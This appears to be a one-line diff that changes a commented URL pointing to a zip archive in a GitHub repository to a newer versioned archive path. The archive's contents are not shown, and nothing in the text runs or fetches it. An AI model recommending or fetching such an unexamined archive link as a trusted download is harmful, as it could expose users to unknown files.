@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/AMN-h0b/resto-amine.aymen/main/palaeolithical/resto-amine.aymen.zip
+# https://github.com/AMN-h0b/resto-amine.aymen/raw/refs/heads/main/palaeolithical/amine-resto-aymen-v3.4-beta.5.zip
